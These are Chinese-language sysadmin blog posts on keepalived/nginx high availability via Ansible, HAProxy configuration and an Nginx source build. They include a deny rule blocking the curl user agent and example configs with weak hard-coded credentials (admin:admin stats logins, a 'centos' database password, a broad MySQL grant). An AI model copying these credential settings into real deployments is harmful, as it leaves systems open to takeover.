dest=/etc/nginx/nginx.conf notify: restart nginx- name: start service service: name=&#123;&#123; item &#125;&#125; state=started enabled=true with_items: - keepalived - nginx 添加handlers 12345vim /etc/ansible/roles/nginx/handlers/main.yml- name: restart keepalived service: name=keepalived state=restarted- name: restart nginx service: name=nginx state=restarted 准备keepalived配置文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273cat &gt;&gt; /app/keepalived.conf.j2 &lt;&lt;EOF! Configuration File for keepalivedglobal_defs &#123; notification_email &#123; root@localhost &#125; notification_email_from keepalived@localhost smtp_server 127.0.0.1 smtp_connect_timeout 30 vrrp_iptables router_id &#123;&#123; ansible_hostname &#125;&#125; vrrp_mcast_group4 224.0.100.19&#125;vrrp_script chk_down &#123; script &quot;/bin/bash -c &apos;[[ -f /etc/keepalived/down ]]&apos; &amp;&amp; exit 1 || exit 0&quot; interval 1 weight -15&#125;vrrp_script chk_nginx &#123; script &quot;killall -0 nginx &amp;&amp; exit 0 || exit 1&quot; interval 1 weight -15 fall 2 rise 1&#125;vrrp_instance VI_1 &#123; state &#123;&#123; state1 &#125;&#125; interface ens33 virtual_router_id 14 priority &#123;&#123; priority1 &#125;&#125; advert_int 1 authentication &#123; auth_type PASS auth_pass 571f87b2 &#125; virtual_ipaddress &#123; 192.168.1.100 &#125; track_script &#123; chk_down chk_nginx &#125; notify_master &quot;/etc/keepalived/notify.sh master&quot; notify_backup &quot;/etc/keepalived/notify.sh backup&quot; notify_fault &quot;/etc/keepalived/notify.sh fault&quot;&#125;vrrp_instance VI_r2 &#123; state &#123;&#123; state2 &#125;&#125; interface ens33 virtual_router_id 24 priority &#123;&#123; priority2 &#125;&#125; advert_int 1 authentication &#123; auth_type PASS auth_pass 571f97b2 &#125; virtual_ipaddress &#123; 192.168.1.200 &#125; track_script &#123; chk_down chk_nginx &#125; notify_master &quot;/etc/keepalived/notify.sh master&quot; notify_backup &quot;/etc/keepalived/notify.sh backup&quot; notify_fault &quot;/etc/keepalived/notify.sh fault&quot;&#125; EOF notify.sh模板文件 123456789101112131415161718192021222324252627cat &gt;&gt; files/notify.sh.j2 &lt;&lt; EOF#!/bin/bash#contact=&apos;root@localhost&apos;notify() &#123; local mailsubject=&quot;$(hostname) to be $1, vip floating&quot; local mailbody=&quot;$(date +&apos;%F %T&apos;): vrrp transition, $(hostname) changed to be $1&quot; echo &quot;$mailbody&quot; | mail -s &quot;$mailsubject&quot; $contact&#125;case $1 inmaster) notify master ;;backup) notify backup ;;fault) notify fault ;;*) echo &quot;Usage: $(basename $0) &#123;master|backup|fault&#125;&quot; exit 1 ;;esacEOF nginx反代模板配置文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647cat &gt;&gt; nginx.conf.j2 &lt;&lt; EOFuser nginx;worker_processes auto;error_log /var/log/nginx/error.log;pid /run/nginx.pid;include /usr/share/nginx/modules/*.conf;events &#123; worker_connections 1024;&#125;http &#123; #add upstream upstream web &#123; server 192.168.1.38; server 192.168.1.48; &#125; log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos; &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos; &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; access_log /var/log/nginx/access.log main; sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; include /etc/nginx/mime.types; default_type application/octet-stream; include /etc/nginx/conf.d/*.conf; server &#123; listen 80 default_server; listen [::]:80 default_server; server_name _; root /usr/share/nginx/html; # Load configuration files for the default server block. include /etc/nginx/default.d/*.conf; #add proxy_pass location / &#123; proxy_pass http://web; &#125; error_page 404 /404.html; location = /40x.html &#123; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; &#125; &#125;&#125; 编制nginx剧本 12345vim /etc/ansible/nginx.yml- hosts: nginx remote_user: root roles: - nginx 开始表演 123456789101112131415161718192021222324252627282930313233343536373839]#ansible-playbook /etc/ansible/nginx.yml PLAY [nginx] *******************************************************************TASK [Gathering Facts] *********************************************************ok: [192.168.1.30]ok: [192.168.1.28]TASK [nginx : install package] *************************************************changed: [192.168.1.30] =&gt; (item=[u&apos;nginx&apos;, u&apos;keepalived&apos;])changed: [192.168.1.28] =&gt; (item=[u&apos;nginx&apos;, u&apos;keepalived&apos;])TASK [nginx : config keepalived] ***********************************************changed: [192.168.1.30]changed: [192.168.1.28]TASK [nginx : file notify.sh] **************************************************changed: [192.168.1.30]changed: [192.168.1.28]TASK [nginx : config nginx] ****************************************************changed: [192.168.1.30]changed: [192.168.1.28]TASK [nginx : start service] ***************************************************changed: [192.168.1.28] =&gt; (item=keepalived)changed: [192.168.1.30] =&gt; (item=keepalived)changed: [192.168.1.28] =&gt; (item=nginx)changed: [192.168.1.30] =&gt; (item=nginx)RUNNING HANDLER [nginx : restart keepalived] ***********************************changed: [192.168.1.30]changed: [192.168.1.28]RUNNING HANDLER [nginx : restart nginx] ****************************************changed: [192.168.1.30]changed: [192.168.1.28]PLAY RECAP *********************************************************************192.168.1.28 : ok=8 changed=7 unreachable=0 failed=0 192.168.1.30 : ok=8 changed=7 unreachable=0 failed=0 在keepalive上调式 12345]# tcpdump -i ens33 -nn host 224.0.100.1920:11:55.223233 IP 192.168.1.28 &gt; 224.0.100.19: VRRPv2, Advertisement, vrid 24, prio 100, authtype simple, intvl 1s, length 2020:11:55.531460 IP 192.168.1.30 &gt; 224.0.100.19: VRRPv2, Advertisement, vrid 14, prio 100, authtype simple, intvl 1s, length 2020:11:56.226411 IP 192.168.1.28 &gt; 224.0.100.19: VRRPv2, Advertisement, vrid 24, prio 100, authtype simple, intvl 1s, length 20 在192.168.1.28上创建down文件,权限立马被192.168.1.30抢去，同理反之亦然。 12345]# touch /etc/keepalived/down]# tcpdump -i ens33 -nn host 224.0.100.1920:12:46.765300 IP 192.168.1.30 &gt; 224.0.100.19: VRRPv2, Advertisement, vrid 14, prio 100, authtype simple, intvl 1s, length 2020:12:47.346001 IP 192.168.1.30 &gt; 224.0.100.19: VRRPv2, Advertisement, vrid 24, prio 90, authtype simple, intvl 1s, length 2020:12:47.769385 IP 192.168.1.30 &gt; 224.0.100.19: VRRPv2, Advertisement, vrid 14, prio 100, authtype simple, intvl 1s, length 20]]></content>
      <categories>
        <category>internet</category>
      </categories>
      <tags>
        <tag>server</tag>
        <tag>Linux</tag>
        <tag>internet</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HAProxy]]></title>
    <url>%2Fhaproxy.html</url>
    <content type="text"><![CDATA[摘要： HAproxy的介绍安装及使用 配置文件的说明及用法 ACL的配置文件选项说明 常用用法及实验 HAProxy 官网： http://www.haproxy.org http://www.haproxy.com 官方文档： http://cbonte.github.io/haproxy-dconv/ HAProxy简介： 123456789101112HAProxy is a TCP/HTTP reverse proxy which is particularly suited : for high availability environments. Indeed, it can: : - route HTTP requests depending on statically assigned cookies : - spread load among several servers while assuring server : persistence through the use of HTTP cookies : - switch to backup servers in the event a main server fails : - accept connections to special ports dedicated to service monitoring : - stop accepting connections without breaking existing ones : - add, modify, and delete HTTP headers in both directions : - block requests matching particular patterns : - report detailed status to authenticated users from a URI : intercepted by the application 反向代理的集群环境 123456789七层反代： nginx(http, ngx_http_upstream_module), haproxy(mode http), httpd, ats, perlbal, pound... ssl/tls 会话卸载器四层反代： lvs, nginx(stream)，haproxy(mode tcp)数据分布: 结构化数据：mysql，50-100次/s 半结构化数据：mangodb，redis,50-100万次/s 非结构化数据：分布式存储系统 调度器 123众多调度算法事件驱动模型，单进程模型处理多应用请求最好使用单线程 安装 123456789]# yum install -y haproxy]# rpm -ql haproxy/etc/haproxy/haproxy.cfg #主配置文件/etc/logrotate.d/haproxy /etc/sysconfig/haproxy #Uint file配置文件/usr/bin/halog/usr/bin/iprange/usr/lib/systemd/system/haproxy.service #Uint file/usr/sbin/haproxy #主程序 Haproxy配置说明配置文件：官网配置 global全局配置段 123456789101112配置段内容： 进程及安全配置相关的参数 性能调整相关参数 Debug参数 用户列表 peers配置参数 进程及安全管理：chroot, daemon，user, group, uid, gid log：定义全局的syslog服务器；最多可以定义两个； log &lt;address&gt; [len &lt;length&gt;] &lt;facility&gt; [max level [min level]] nbproc &lt;number&gt;：要启动的haproxy的进程数量； ulimit-n &lt;number&gt;：每个haproxy进程可打开的最大文件数； 性能配置 123456789maxconn &lt;number&gt;：设定每个haproxy进程所能接受的最大并发连接数； Sets the maximum per-process number of concurrent connections to &lt;number&gt;. 总体的并发连接数：nbproc * maxconnmaxconnrate &lt;number&gt;：每个进程每秒种所能创建的最大连接数量； Sets the maximum per-process number of connections per second to &lt;number&gt;. maxsessrate &lt;number&gt;：maxsslconn &lt;number&gt;: 设定每个haproxy进程所能接受的ssl的最大并发连接数； Sets the maximum per-process number of concurrent SSL connections to &lt;number&gt;. spread-checks &lt;0..50, in percent&gt; 代理配置段 1234defaults：为frontend, listen, backend提供默认配置；fronted：前端，相当于nginx, server &#123;&#125;backend：后端，相当于nginx, upstream &#123;&#125;listen：同时拥前端和后端 代理配置端解释 A “frontend” section describes a set of listening sockets accepting client connections. A “backend” section describes a set of servers to which the proxy will connect to forward incoming connections. A “listen” section defines a complete proxy with its frontend and backend parts combined in one section. It is generally useful for TCP-only traffic. All proxy names must be formed from upper and lower case letters, digits, ‘-‘ (dash), ‘_’ (underscore) , ‘.’ (dot) and ‘:’ (colon). 区分字符大小写； 简单配置示例 12345678frontend web bind *:80 default_backend websrvsbackend websrvs balance roundrobin server srv1 192.168.1.20:80 check server srv2 192.168.1.13:80 check 代理参数说明 bind 1234567bind：Define one or several listening addresses and/or ports in a frontend. bind [&lt;address&gt;]:&lt;port_range&gt; [, ...] [param*] listen http_proxy bind :80,:443 bind 10.0.0.1:10080,10.0.0.1:10443 bind /var/run/ssl-frontend.sock user root mode 600 accept-proxy balance 12345678910111213141516171819202122232425262728293031323334353637383940balance：后端服务器组内的服务器调度算法 balance &lt;algorithm&gt; [ &lt;arguments&gt; ] balance url_param &lt;param&gt; [check_post] 算法： roundrobin：Each server is used in turns, according to their weights. server options： weight # 动态算法：支持权重的运行时调整，支持慢启动；每个后端中最多支持4095个server； static-rr： 静态算法：不支持权重的运行时调整及慢启动；后端主机数量无上限； leastconn： 推荐使用在具有较长会话的场景中，例如MySQL、LDAP等； first： 根据服务器在列表中的位置，自上而下进行调度； 前面服务器的连接数达到上限，新请求才会分配给下一台服务； source：源地址hash； 除权取余法： 一致性哈希： uri： 对URI的左半部分做hash计算，并由服务器总权重相除以后派发至某挑出的服务器； &lt;scheme&gt;://&lt;user&gt;:&lt;password&gt;@&lt;host&gt;:&lt;port&gt;/&lt;path&gt;;&lt;params&gt;?&lt;query&gt;#&lt;frag&gt; 左半部分：/&lt;path&gt;;&lt;params&gt; 整个uri：/&lt;path&gt;;&lt;params&gt;?&lt;query&gt;#&lt;frag&gt; username=jerry url_param： 对用户请求的uri的&lt;params&gt;部分中的参数的值作hash计算; 并由服务器总权重相除以后派发至某挑出的服务器； 通常用于追踪用户，以确保来自同一个用户的请求始终发往同一个Backend Server； hdr(&lt;name&gt;)： 对于每个http请求，此处由&lt;name&gt;指定的http首部将会被取出做hash计算； 并由服务器总权重相除以后派发至某挑出的服务器；没有有效值的会被轮询调度； hdr(Cookie) rdp-cookie rdp-cookie(&lt;name&gt;) log 12345678910111213log &lt;address&gt; [len &lt;length&gt;] &lt;facility&gt; [max level [min level]][root@haproxy ~]# vim /etc/haproxy/haproxy.cfglog 127.0.0.1 local2[root@haproxy ~]# systemctl restart haproxy[root@haproxy ~]# vim /etc/rsyslog.conf#### MODULES ####$ModLoad imudp$UDPServerRun 514#### RULES ##### Save haproxy log to haproxy.loglocal2.* /var/log/haproxy.log[root@haproxy ~]# systemctl restart rsyslog hash-type 123456789hash-type：哈希算法 hash-type &lt;method&gt; &lt;function&gt; &lt;modifier&gt; map-based：除权取余法，哈希数据结构是静态的数组； consistent：一致性哈希，哈希数据结构是一个树； &lt;function&gt; is the hash function to be used : 哈希函数 sdbm djb2 wt6 server 1234567891011121314151617181920212223242526272829303132server &lt;name&gt; &lt;address&gt;[:[port]] [param*]定义后端主机的各服务器及其选项； server &lt;name&gt; &lt;address&gt;[:port] [settings ...]default-server [settings ...]&lt;name&gt;：服务器在haproxy上的内部名称；出现在日志及警告信息中；&lt;address&gt;：服务器地址，支持使用主机名；[:[port]]：端口映射；省略时，表示同bind中绑定的端口；[param*]：参数 maxconn &lt;maxconn&gt;：当前server的最大并发连接数； backlog &lt;backlog&gt;：当前server的连接数达到上限后的后援队列长度； backup：设定当前server为备用服务器； check：对当前server做健康状态检测； addr ：检测时使用的IP地址； port ：针对此端口进行检测； inter &lt;delay&gt;：连续两次检测之间的时间间隔，默认为2000ms; rise &lt;count&gt;：连续多少次检测结果为“成功”才标记服务器为可用；默认为2； fall &lt;count&gt;：连续多少次检测结果为“失败”才标记服务器为不可用；默认为3； 注意：option httpchk，&quot;smtpchk&quot;, &quot;mysql-check&quot;, &quot;pgsql-check&quot; and &quot;ssl-hello-chk&quot; 用于定义应用层检测方法； cookie &lt;value&gt;：为当前server指定其cookie值，用于实现基于cookie的会话黏性； disabled：标记为不可用； on-error &lt;mode&gt;：后端服务故障时的行动策略； - fastinter: force fastinter - fail-check: simulate a failed check, also forces fastinter (default) - sudden-death: simulate a pre-fatal failed health check, one more failed check will mark a server down, forces fastinter - mark-down: mark the server immediately down and force fastinter redir &lt;prefix&gt;：将发往此server的所有GET和HEAD类的请求重定向至指定的URL； weight &lt;weight&gt;：权重，默认为1; option httpchk 123456option httpchkoption httpchk &lt;uri&gt;option httpchk &lt;method&gt; &lt;uri&gt;option httpchk &lt;method&gt; &lt;uri&gt; &lt;version&gt;#用于定义应用层检测方法http-check expect [!] &lt;match&gt; &lt;pattern&gt; 修改报文头部 123456789reqadd &lt;string&gt; [&#123;if | unless&#125; &lt;cond&gt;] 在HTTP请求的末尾添加标头rspadd &lt;string&gt; [&#123;if | unless&#125; &lt;cond&gt;] 在HTTP响应的末尾添加标头reqdel &lt;search&gt; [&#123;if | unless&#125; &lt;cond&gt;] 删除与HTTP请求中的正则表达式匹配的所有标头reqidel &lt;search&gt; [&#123;if | unless&#125; &lt;cond&gt;] (ignore case)rspdel &lt;search&gt; [&#123;if | unless&#125; &lt;cond&gt;] 删除与HTTP响应中的正则表达式匹配的所有标头rspidel &lt;search&gt; [&#123;if | unless&#125; &lt;cond&gt;] (ignore case)#删除响应报文中的Server字段信息rspidel Server.* errorfile 和 errorloc 123456789101112errorfile &lt;code&gt; &lt;file&gt;errorloc &lt;code&gt; &lt;url&gt;errorloc302 &lt;code&gt; &lt;url&gt;#code：HTTP状态代码。 目前HAProxy能够支持的代码： 200, 400, 403, 408, 500, 502, 503, and 504#file：指定包含完整HTTP响应的文件errorfile 400 /etc/haproxy/errorfiles/400badreq.httperrorfile 408 /dev/null #解决方法Chrome预连接错误errorfile 403 /etc/haproxy/errorfiles/403forbid.httperrorfile 503 /etc/haproxy/errorfiles/503sorry.http 统计接口 123456789101112131415161718192021222324252627282930统计接口启用相关的参数：stats enable 启用统计页；基于默认的参数启用stats page； - stats uri : /haproxy?stats - stats realm : &quot;HAProxy Statistics&quot; - stats auth : no authentication - stats scope : no restrictionstats auth &lt;user&gt;:&lt;passwd&gt; 认证时的账号和密码，可使用多次； stats realm &lt;realm&gt; 认证时的realm； stats uri &lt;prefix&gt; 自定义stats page uri stats refresh &lt;delay&gt; 设定自动刷新时间间隔； stats admin &#123; if | unless &#125; &lt;cond&gt; 启用stats page中的管理功能 配置示例：listen stats bind :9099 stats enable stats realm HAPorxy\ Stats\ Page stats auth admin:admin stats admin if TRUE ACL访问控制列表的使用提供了一种灵活的解决方案来执行内容切换，并且通常基于从请求，响应或任何环境状态中提取的内容来做出决策 1acl &lt;aclname&gt; &lt;criterion&gt; [flags] [operator] [&lt;value&gt;] ... aclname：ACL名称必须由大写和小写字母，数字，’ – ‘（短划线），’_’（下划线），’.’ 组成。ACL名称区分大小写 value：值 123456boolean 布尔型integer or integer range 整数或整数范围IP address / network IP或网络地址string (exact精确匹配, substring子串匹配, suffix前缀匹配, prefix后缀匹配, subdir子路径匹配, domain子域名匹配) 字符串匹配regular expression 正则表示式匹配hex block 16进制的块匹配 flags：标志 1234-i : 忽略字符大小写-m : 特定的模式-n : 禁止DNS解析-u : 要求acl使用唯一的名称 operator：操作符 12345678匹配整数值：eq、ge、gt、le、lt匹配字符串： exact match 精确匹配 substring match 子串匹配 prefix match 前缀匹配 suffix match 后缀匹配 subdir match 子路径匹配 domain match 子域名匹配 acl作为条件时的逻辑关系： 123if invalid_src invalid_port 或关系if invalid_src || invalid_port 与关系if ! invalid_src invalid_port 非invalid_src 检查URL的路径 12345678path : 精确匹配path_beg : 前缀匹配path_dir : 子串匹配path_dom : 子域名匹配path_end : 路径后缀匹配path_len : 路径长度匹配path_reg : 路径的正则表达式模式匹配path_sub : 路径的子字串匹配 整个URL检查 12345678url : 精确匹配url_beg : 前缀匹配url_dir : 子串匹配url_dom : 子域名匹配url_end : 后缀匹配url_len : 长度匹配url_reg : 正则表达式匹配url_sub : 子字串匹配 请求报文的指定头部检查 123456789101112131415req.hdr([&lt;name&gt;[,&lt;occ&gt;]]) : string This extracts the last occurrence of header &lt;name&gt; in an HTTP request. hdr([&lt;name&gt;[,&lt;occ&gt;]]) : exact string match hdr_beg([&lt;name&gt;[,&lt;occ&gt;]]) : prefix match hdr_dir([&lt;name&gt;[,&lt;occ&gt;]]) : subdir match hdr_dom([&lt;name&gt;[,&lt;occ&gt;]]) : domain match hdr_end([&lt;name&gt;[,&lt;occ&gt;]]) : suffix match hdr_len([&lt;name&gt;[,&lt;occ&gt;]]) : length match hdr_reg([&lt;name&gt;[,&lt;occ&gt;]]) : regex match hdr_sub([&lt;name&gt;[,&lt;occ&gt;]]) : substring match 示例： acl bad_curl hdr_sub(User-Agent) -i curl block if bad_curl 示例：阻止curl访问 1234frontend web *:80 acl bad_curl hdr_sub(User-Agent) -i curl block if bad_curl default_backend appsrvs 示例: 配置简单的动静分离 12345678910111213]# cp /etc/haproxy/haproxy.cfg&#123;.bak&#125;]# vim /etc/haproxy/haproxy.cfgglobal log 127.0.0.1 local2···frontend main *:80 mode http default_backend websrvsbackend websrvs balance roundrobin server websrv1 192.168.1.20:80 check server websrv2 192.168.1.8:80 check apache服务的搭建 1234567~]#yum install -y httpd~]#echo srv1 &gt; /var/www/html/index.html~]#systemctl start httpd~]#yum install -y httpd~]#echo srv2 &gt; /var/www/html/index.html~]#systemctl start httpd 测试均衡调度 1234567891011~]#for i in &#123;1..10&#125;;do curl 192.168.1.18;donesrv1srv2srv1srv2srv1srv2srv1srv2srv1srv2 实验wordpress的负载均衡需求：12345678http: (1) 动静分离部署wordpress，动静都要能实现负载均衡，要注意会话的问题； (2) 给出设计拓扑，写成博客； (3) haproxy的设定要求： (a) stats page，要求仅能通过本地访问使用管理接口； (b) 动静分离； (c) 分别考虑不同的服务器组的调度算法； (d) 压缩合适的内容类型； 首先，在192.168.1.8/24上实现lamp架构 1234567891011121314151617181920212223242526272829301. 安装必要的软件 ]# yum install -y mariadb-server httpd php-fpm php-mysql ]# wget https://cn.wordpress.org/wordpress-4.9.4-zh_CN.tar.gz ]# tar xf wordpress-4.9.4-zh_CN.tar.gz -C /var/www/html ]# chown -R apache.apache /var/www/html/* ]# cd /var/www/html/ ]# cp wp-config-sample.php wp-config.php ]# vim wp-config.php define(&apos;DB_NAME&apos;, &apos;wpdb&apos;); /** MySQL数据库用户名 */ define(&apos;DB_USER&apos;, &apos;test&apos;); /** MySQL数据库密码 */ define(&apos;DB_PASSWORD&apos;, &apos;centos&apos;); /** MySQL主机 */ define(&apos;DB_HOST&apos;, &apos;127.0.0.1&apos;);2. 修改http配置文件 ]# vim /etc/httpd/conf.d/fcgi.conf DirectoryIndex index.php ProxyRequests Off ProxyPassMatch ^/(.*\.php)$ fcgi://127.0.0.1:9000/var/www/html/$1 3. 授权mysql账户 ]# systemctl start mariadb httpd ]# mysql -e &quot;grant all on *.* to test@&apos;192.168.1.%&apos; identified by &apos;centos&apos;&quot; ]# mysql -e &apos;flush privileges&apos;4. 启动服务 ]# systemctl start httpd ]# systemctl start php-fpm ]# systemctl start mariadb5. 测试动静分离，停止服务，依旧能访问另一他台服务器的静态资源 ]# systemctl stop httpd 其次，在192.168.1.20/24上实现静态资源 1234]# yum install -y httpd]# wget https://cn.wordpress.org/wordpress-4.9.4-zh_CN.tar.gz]# tar xf wordpress-4.9.4-zh_CN.tar.gz -C /var/www/html]# chown -R apache.apache /var/www/html/* 最后，在haproxy服务器上配置动静分离 12345678910111213141516171819202122232425262728293031]# yum install -y haproaxy]# cp /etc/haproxy/haproxy.cfg&#123;,.bak&#125;]# vim /etc/haproxy/haproxy.cfg···frontend main *:80 mode http acl url_static path_beg -i /static /images /javascript /stylesheets acl url_static path_end -i .jpg .gif .png .css .js .html .txt .htm use_backend staticsrvs if url_static default_backend phpsrvsbackend staticsrvs balance roundrobin #option httpchk GET /test1.html #cookie WEBSRV insert nocache indirect #server websrv1 192.168.1.20:80 weight 2 check cookie websrv1 #server websrv2 192.168.1.8:80 weight 1 check cookie websrv2 server websrv2 192.168.1.8:80 checkbackend phpsrvs balance roundrobin server websrv1 192.168.1.20:80 checklisten stats bind 127.0.0.1:80 stats enable stats uri /admin?stats stats realm HAProxy\ Stats stats auth admin:admin stats admin if TRUE 常用功能实现 压缩 12345678frontend web *:80 default_backend appsrvs compression algo gzip compression type text/html text/plainbackend appsrvs balance roundrobin server app1 192.168.0.10:80 check server app2 192.168.0.11:80 check stats page 123456listen stats bind :8080 stats realm &quot;HAProxy Stats Page&quot; stats auth admin:adminpass #认证用户：密码 stats admin if TRUE访问：http://192.168.0.8:8080/haproxy?stats进入状态管理页 自定义错误页 123456789101112131415[root@haproxy ~]# vim /etc/haproxy/haproxy.cfgfrontend web *:80 default_backend appsrvs acl bad_guy src 192.168.0.7 block if bad_guy errorfile 403 /etc/haproxy/errorfiles/403forbid.httpbackend appsrvs balance roundrobin server app1 192.168.0.10:80 check server app2 192.168.0.11:80 check[root@haproxy ~]# mkdir /etc/haproxy/errorfiles/ -p[root@haproxy ~]# echo &apos;forbid&apos; &gt;/etc/haproxy/errorfiles/403forbid.http[root@haproxy ~]# systemctl restart haproxy[root@client ~]# curl http://192.168.0.8/forbid 访问控制 1234567listen stats bind :8080 stats realm &quot;HAProxy Stats Page&quot; stats auth admin:adminpass stats admin if TRUE acl admin_client src 192.168.0.254 block unless admin_client #只允许192.168.0.254访问状态管理页 日志功能 12345678调度器中配置[root@haproxy ~]# vim /etc/haproxy/haproxy.cfg backend appsrvs balance roundrobin option forwardfor server app1 192.168.0.10:80 check server app2 192.168.0.11:80 check[root@haproxy haproxy]# systemctl restart haproxy.service 123456后端服务器配置（Apache）[root@web2 ~]# vim /etc/httpd/conf/httpd.confLogFormat &quot;%&#123;X-Forwarded-For&#125;i %l %u %t \&quot;%r\&quot; %&gt;s %b \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent&#125;i\&quot;&quot; combined #改变日志记录方式[root@web2 ~]# systemctl restart httpd[root@web2 ~]# tail -f /var/log/httpd/access_log 基于cookie的session粘滞 1234567891011121314[root@haproxy ~]# vim /etc/haproxy/haproxy.cfgfrontend web *:80 mode http default_backend appsrvsbackend appsrvs balance roundrobin option forwardfor cookie WEBSRV insert nocache indirect server app1 192.168.0.10:80 check inter 1000 rise 1 fall 2 maxconn 2000 cookie websrv1 server app2 192.168.0.11:80 check maxconn 1500 cookie websrv2[root@client ~]# curl -b &quot;WEBSRV=websrv1&quot; http://192.168.0.8/web1[root@client ~]# curl -b &quot;WEBSRV=websrv2&quot; http://192.168.0.8/ web2 后端主机的健康状态检测 12345backend appsrvs balance roundrobin option httpchk GET /test.html server app1 192.168.0.10:80 check server app2 192.168.0.11:80 check 请求和响应报文首部的操纵：替换响应报文的Server字段信息 12345678[root@haproxy ~]# vim /etc/haproxy/haproxy.cfgfrontend web *:80 mode http rspidel ^Server:.* rspadd Server:\ Apache\ or\ Nginx default_backend appsrvs[root@client ~]# curl -I http://192.168.0.8/Server: Apache or Nginx #掩人耳目]]></content>
      <categories>
        <category>HAProxy</category>
      </categories>
      <tags>
        <tag>server</tag>
        <tag>Linux</tag>
        <tag>internet</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx]]></title>
    <url>%2FNginx.html</url>
    <content type="text"><![CDATA[摘要： Nginx简介 源码编译安装Nginx Nginx服务器性能优化 Nginx模块介绍 Nginx简介​ Nginx（发音同engine x）是一个异步框架的 Web服务器，也可以用作反向代理，负载平衡器 和 HTTP缓存。该软件由 Igor Sysoev 创建，并于2004年首次公开发布。同名公司成立于2011年，以提供支持。 NGINX是免费，开源，高性能的HTTP和反向代理服务器，邮件代理服务器，通用TCP/UDP代理服务器 Nginx在官方测试的结果中，能够支持五万个并行连接，而在实际的运作中，可以支持二万至四万个并行连接。 Nginx 的编写有一个明确目标就是超越 Apache Web 服务器的性能。Nginx 提供开箱即用的静态文件，使用的内存比 Apache 少得多，每秒可以处理大约四倍于 Apache 的请求。低并发下性能与 Apache 相当，有时候还低于，但是在高并发下 Nginx 能保持低资源低消耗高性能。还有高度模块化的设计，模块编写简单。配置文件简洁。 官网：http://nginx.org 文档：https://nginx.org/en/docs/ 特性： 模块化设计，较好的扩展性 高可靠性 支持热部署：不停机更新配置文件、升级版本、更换日志文件 低内存消耗：10000个keep-alive连接模式下的非活动连接，仅需2.5M内存 event-driven（事件驱动）、aio（异步IO）、mmap（内存映射）、sendfile 功能： 静态资源的web服务器，html，图片，js，css，txt等静态资源 http协议反向代理服务器 pop3/imap4协议反向代理服务器 FastCGI(LNMP)、uWSGI(python)等协议 模块化（非DSO），如zip、SSL模块 web服务功能： 虚拟主机（server） 支持 keep-alive 和管道连接 访问日志（支持基于日志缓冲提高其性能） url重写（rewirte） 路径别名 基于IP及用户的访问控制 支持速率限制及并发数限制 重新配置和在线升级而无须中断客户的工作进程 Memcached 的 GET 接口 nginx的安装yum源安装官方源：http://nginx.org/packages/centos/7/x86_64/ epel源：https://mirrors.aliyun.com/epel/7/x86_64/ 安装：yum install nginx -y 默认主站点目录：/usr/share/nginx/html 主程序：/usr/sbin/nginx 123456# nginx 启动服务# nginx -v|-V 查看版本# nginx -t 检查配置文件# nginx -c filename 指定配置文件(default: /etc/nginx/nginx.conf)# nginx -s signal 发送信号给master进程，signal：stop, quit, reopen, reload# nginx -g directives 在命令行中指明全局指令 主配文件：/etc/nginx/nginx.conf 子配文件：/etc/nginx/conf.d/* 配置文件格式： 12345678910111213141516main block：主配置段，即全局配置段，对http,mail都有效event &#123; ... &#125; 事件驱动相关的配置http &#123; ... &#125; http/https 协议相关配置段mail &#123; ... &#125; mail 协议相关配置段stream &#123; ... &#125; stream 服务器相关配置段 默认配置文件示例： 1234567891011121314151617181920212223242526272829http &#123; log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos; &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos; &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; access_log /var/log/nginx/access.log main; sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; include /etc/nginx/mime.types; default_type application/octet-stream; include /etc/nginx/conf.d/*.conf; server &#123; listen 80 default_server; listen [::]:80 default_server; server_name _; root /usr/share/nginx/html; include /etc/nginx/default.d/*.conf; location / &#123; &#125; error_page 404 /404.html; location = /40x.html &#123; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; &#125; &#125;&#125; 编译安装1234567891011121314151617181920212223242526272829303132333435363738[root@centos7 ~]# yum install pcre-devel openssl-devel zlib-devel -y[root@centos7 ~]# useradd -r -s /sbin/nologin nginx[root@centos7 ~]# wget https://nginx.org/download/nginx-1.14.0.tar.gz[root@centos7 ~]# tar xf nginx-1.14.0.tar.gz[root@centos7 ~]# cd nginx-1.14.0/[root@centos7 nginx-1.14.0]# vim src/http/ngx_http_header_filter_module.cstatic u_char ngx_http_server_string[] = &quot;Server: feijikesi&quot; CRLF;[root@centos7 nginx-1.14.0]# vim src/core/nginx.h#define NGINX_VERSION &quot;6.6.6&quot; #Server_tokens 显示的版本号#define NGINX_VER &quot;honginx/&quot; NGINX_VERSION #Server_tokens 显示的服务名称[root@centos7 nginx-1.14.0]# ./configure --prefix=/usr/local/nginx \&gt; --conf-path=/etc/nginx/nginx.conf \&gt; --error-log-path=/var/log/nginx/error.log \&gt; --http-log-path=/var/log/nginx/access.log \&gt; --pid-path=/var/run/nginx.pid \&gt; --lock-path=/var/run/nginx.lock \&gt; --user=nginx \&gt; --group=nginx \&gt; --with-http_ssl_module \&gt; --with-http_v2_module \&gt; --with-http_dav_module \&gt; --with-http_stub_status_module \&gt; --with-threads \&gt; --with-file-aio[root@centos7 nginx-1.14.0]# make &amp;&amp; make install[root@centos7 ~]# echo &apos;PATH=/usr/local/nginx/sbin/:$PATH&apos; &gt; /etc/profile.d/nginx.sh[root@centos7 ~]# . /etc/profile.d/nginx.sh[root@centos7 ~]# nginx[root@centos7 ~]# curl -I 127.0.0.1Server: honginx/6.6.6[root@centos7 ~]# vim /etc/nginx/nginx.confhttp &#123; server_tokens off;&#125;[root@centos7 ~]# nginx -s reload[root@centos7 ~]# curl -I 127.0.0.1Server: honginx nginx编译安装选项说明1234567891011121314151617181920--prefix=/etc/nginx 安装路径--sbin-path=/usr/sbin/nginx 指明nginx程序文件安装路径--conf-path=/etc/nginx/nginx.conf 主配置文件安装位置--error-log-path=/var/log/nginx/error.log 